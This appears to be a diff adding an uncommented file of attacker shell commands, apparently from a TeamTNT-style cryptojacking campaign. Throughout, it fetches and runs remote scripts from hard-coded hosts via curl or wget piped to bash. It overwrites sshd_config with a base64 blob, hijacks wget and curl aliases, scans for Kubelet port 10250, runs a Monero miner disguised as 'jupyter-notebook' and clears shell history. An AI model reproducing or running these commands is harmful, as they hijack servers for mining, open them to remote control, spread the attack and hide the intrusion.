@@ -1,0 +1,81 @@
+python -c 'import urllib;exec(urllib.urlopen("http://205.185.113.151/d.py").read())'
+/usr/bin/perl use LWP::Simple; getstore("http://45.9.148.35/chimaera/bin/x86_64/tmate", "tmate");
+
+wget http://45.9.148.35/chimaera/
+
+
+wget http://45.9.148.35/chimaera/bin/64bit/pei -O /usr/bin/pei && chmod +x /usr/bin/pei
+wget http://45.9.148.35/chimaera/bin/64bit/bob -O /usr/bin/bob && chmod +x /usr/bin/bob
+
+
+wget http://45.9.148.35/chimaera/bin/pnscan_1.12+git20180612.orig.tar.gz -O /var/tmp/pnscan_1.12+git20180612.orig.tar.gz
+
+
+echo IyBQYWNrYWdlIGdlbmVyYXRlZCBjb25maWd1cmF0aW9uIGZpbGUKIyBTZWUgdGhlIHNzaGRfY29uZmlnKDUpIG1hbnBhZ2UgZm9yIGRldGFpbHMKCiMgV2hhdCBwb3J0cywgSVBzIGFuZCBwcm90b2NvbHMgd2UgbGlzdGVuIGZvcgpQb3J0IDIyCiMgVXNlIHRoZXNlIG9wdGlvbnMgdG8gcmVzdHJpY3Qgd2hpY2ggaW50ZXJmYWNlcy9wcm90b2NvbHMgc3NoZCB3aWxsIGJpbmQgdG8KI0xpc3RlbkFkZHJlc3MgOjoKI0xpc3RlbkFkZHJlc3MgMC4wLjAuMApQcm90b2NvbCAyCiMgSG9zdEtleXMgZm9yIHByb3RvY29sIHZlcnNpb24gMgpIb3N0S2V5IC9ldGMvc3NoL3NzaF9ob3N0X3JzYV9rZXkKSG9zdEtleSAvZXRjL3NzaC9zc2hfaG9zdF9kc2Ffa2V5Ckhvc3RLZXkgL2V0Yy9zc2gvc3NoX2hvc3RfZWNkc2Ffa2V5Ckhvc3RLZXkgL2V0Yy9zc2gvc3NoX2hvc3RfZWQyNTUxOV9rZXkKI1ByaXZpbGVnZSBTZXBhcmF0aW9uIGlzIHR1cm5lZCBvbiBmb3Igc2VjdXJpdHkKVXNlUHJpdmlsZWdlU2VwYXJhdGlvbiB5ZXMKCiMgTGlmZXRpbWUgYW5kIHNpemUgb2YgZXBoZW1lcmFsIHZlcnNpb24gMSBzZXJ2ZXIga2V5CktleVJlZ2VuZXJhdGlvbkludGVydmFsIDM2MDAKU2VydmVyS2V5Qml0cyAxMDI0CgojIExvZ2dpbmcKU3lzbG9nRmFjaWxpdHkgQVVUSApMb2dMZXZlbCBJTkZPCgojIEF1dGhlbnRpY2F0aW9uOgpMb2dpbkdyYWNlVGltZSAxMjAKUGVybWl0Um9vdExvZ2luIHllcwpTdHJpY3RNb2RlcyB5ZXMKClJTQUF1dGhlbnRpY2F0aW9uIHllcwpQdWJrZXlBdXRoZW50aWNhdGlvbiB5ZXMKI0F1dGhvcml6ZWRLZXlzRmlsZQklaC8uc3NoL2F1dGhvcml6ZWRfa2V5cwoKIyBEb24ndCByZWFkIHRoZSB1c2VyJ3Mgfi8ucmhvc3RzIGFuZCB+Ly5zaG9zdHMgZmlsZXMKSWdub3JlUmhvc3RzIHllcwojIEZvciB0aGlzIHRvIHdvcmsgeW91IHdpbGwgYWxzbyBuZWVkIGhvc3Qga2V5cyBpbiAvZXRjL3NzaF9rbm93bl9ob3N0cwpSaG9zdHNSU0FBdXRoZW50aWNhdGlvbiBubwojIHNpbWlsYXIgZm9yIHByb3RvY29sIHZlcnNpb24gMgpIb3N0YmFzZWRBdXRoZW50aWNhdGlvbiBubwojIFVuY29tbWVudCBpZiB5b3UgZG9uJ3QgdHJ1c3Qgfi8uc3NoL2tub3duX2hvc3RzIGZvciBSaG9zdHNSU0FBdXRoZW50aWNhdGlvbgojSWdub3JlVXNlcktub3duSG9zdHMgeWVzCgojIFRvIGVuYWJsZSBlbXB0eSBwYXNzd29yZHMsIGNoYW5nZSB0byB5ZXMgKE5PVCBSRUNPTU1FTkRFRCkKUGVybWl0RW1wdHlQYXNzd29yZHMgbm8KCiMgQ2hhbmdlIHRvIHllcyB0byBlbmFibGUgY2hhbGxlbmdlLXJlc3BvbnNlIHBhc3N3b3JkcyAoYmV3YXJlIGlzc3VlcyB3aXRoCiMgc29tZSBQQU0gbW9kdWxlcyBhbmQgdGhyZWFkcykKQ2hhbGxlbmdlUmVzcG9uc2VBdXRoZW50aWNhdGlvbiBubwoKIyBDaGFuZ2UgdG8gbm8gdG8gZGlzYWJsZSB0dW5uZWxsZWQgY2xlYXIgdGV4dCBwYXNzd29yZHMKUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMKCiMgS2VyYmVyb3Mgb3B0aW9ucwojS2VyYmVyb3NBdXRoZW50aWNhdGlvbiBubwojS2VyYmVyb3NHZXRBRlNUb2tlbiBubwojS2VyYmVyb3NPckxvY2FsUGFzc3dkIHllcwojS2VyYmVyb3NUaWNrZXRDbGVhbnVwIHllcwoKIyBHU1NBUEkgb3B0aW9ucwojR1NTQVBJQXV0aGVudGljYXRpb24gbm8KI0dTU0FQSUNsZWFudXBDcmVkZW50aWFscyB5ZXMKClgxMUZvcndhcmRpbmcgeWVzClgxMURpc3BsYXlPZmZzZXQgMTAKUHJpbnRNb3RkIG5vClByaW50TGFzdExvZyB5ZXMKVENQS2VlcEFsaXZlIHllcwojVXNlTG9naW4gbm8KCiNNYXhTdGFydHVwcyAxMDozMDo2MAojQmFubmVyIC9ldGMvaXNzdWUubmV0CgojIEFsbG93IGNsaWVudCB0byBwYXNzIGxvY2FsZSBlbnZpcm9ubWVudCB2YXJpYWJsZXMKQWNjZXB0RW52IExBTkcgTENfKgoKU3Vic3lzdGVtIHNmdHAgL3Vzci9saWIvb3BlbnNzaC9zZnRwLXNlcnZlcgoKIyBTZXQgdGhpcyB0byAneWVzJyB0byBlbmFibGUgUEFNIGF1dGhlbnRpY2F0aW9uLCBhY2NvdW50IHByb2Nlc3NpbmcsCiMgYW5kIHNlc3Npb24gcHJvY2Vzc2luZy4gSWYgdGhpcyBpcyBlbmFibGVkLCBQQU0gYXV0aGVudGljYXRpb24gd2lsbAojIGJlIGFsbG93ZWQgdGhyb3VnaCB0aGUgQ2hhbGxlbmdlUmVzcG9uc2VBdXRoZW50aWNhdGlvbiBhbmQKIyBQYXNzd29yZEF1dGhlbnRpY2F0aW9uLiAgRGVwZW5kaW5nIG9uIHlvdXIgUEFNIGNvbmZpZ3VyYXRpb24sCiMgUEFNIGF1dGhlbnRpY2F0aW9uIHZpYSBDaGFsbGVuZ2VSZXNwb25zZUF1dGhlbnRpY2F0aW9uIG1heSBieXBhc3MKIyB0aGUgc2V0dGluZyBvZiAiUGVybWl0Um9vdExvZ2luIHdpdGhvdXQtcGFzc3dvcmQiLgojIElmIHlvdSBqdXN0IHdhbnQgdGhlIFBBTSBhY2NvdW50IGFuZCBzZXNzaW9uIGNoZWNrcyB0byBydW4gd2l0aG91dAojIFBBTSBhdXRoZW50aWNhdGlvbiwgdGhlbiBlbmFibGUgdGhpcyBidXQgc2V0IFBhc3N3b3JkQXV0aGVudGljYXRpb24KIyBhbmQgQ2hhbGxlbmdlUmVzcG9uc2VBdXRoZW50aWNhdGlvbiB0byAnbm8nLgpVc2VQQU0geWVzCgo= | base64 -d > /etc/ssh/sshd_config
+
+
+
+https://download-ib01.fedoraproject.org/pub/fedora/linux/updates/32/Everything/x86_64/Packages/o/openssh-8.3p1-3.fc32.x86_64.rpm
+
+rpm -i https://download-ib01.fedoraproject.org/pub/fedora/linux/updates/testing/32/Everything/x86_64/Packages/l/libxcrypt-4.4.18-1.fc32.x86_64.rpm
+
+
+
+
+dropbearkey -t rsa -s 4096 -f key
+
+
+
+wget http://matt.ucc.asn.au/dropbear/dropbear-0.52.tar.bz2
+https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.4p1.tar.gz
+
+
+
+curl -Lk "http://teamtnt.red/set/up/pei.php?dlmode=curl" | bash
+
+masscan --open -p10250 147.75.32.98/31
+zmap -B 50M --max-sendto-failures 1000000 -c5 -o- -p 10250 147.75.32.98/31
+
+wget http://45.9.148.35/chimaera/bin/64bit/zmap -O /usr/bin/zmap && chmod +x /usr/bin/zmap
+
+
+wget https://github.com/ptrrkssn/pnscan/archive/master.zip
+unzip master.zip
+./configure
+make 
+make install
+
+
+pnscan 147.75.32.98/31 10250
+
+
+echo 'alias wget="/var/tmp/wget"' >> ~/.bash_aliases ; echo 'alias curl="/var/tmp/curl"' >> ~/.bash_aliases
+
+
+
+wget -q -O - http://45.9.148.85/LevelUp/bin/bots/TNT_AWS.sh | bash && wget -O - http://45.9.148.85/LevelUp/snitch.sh | bash
+
+wget -O - http://45.9.148.85/LevelUp/snitch.sh | bash || curl http://45.9.148.85/LevelUp/snitch.sh | bash
+rm -f /home/ciuser/.../systemd ; pkill systemd
+wget 45.9.148.85/Ya-wer/bin/xmr/x86_64 -O /var/tmp/jupyter-notebook || curl 45.9.148.85/Ya-wer/bin/xmr/x86_64 -o /var/tmp/jupyter-notebook
+chmod +x /var/tmp/jupyter-notebook
+cd /var/tmp/
+./jupyter-notebook
+cd /
+wget -O - borg.wtf/aws.sh | bash || curl borg.wtf/aws.sh | bash 
+history -c   
+clear
+
+
+curl -# -A TeamTNT -Lk "http://teamtnt.red/set/up/pei.php?dlmode=curl" | bash
+
+
+yum install -y uidmap
+
+
+
+
+
+
+
+
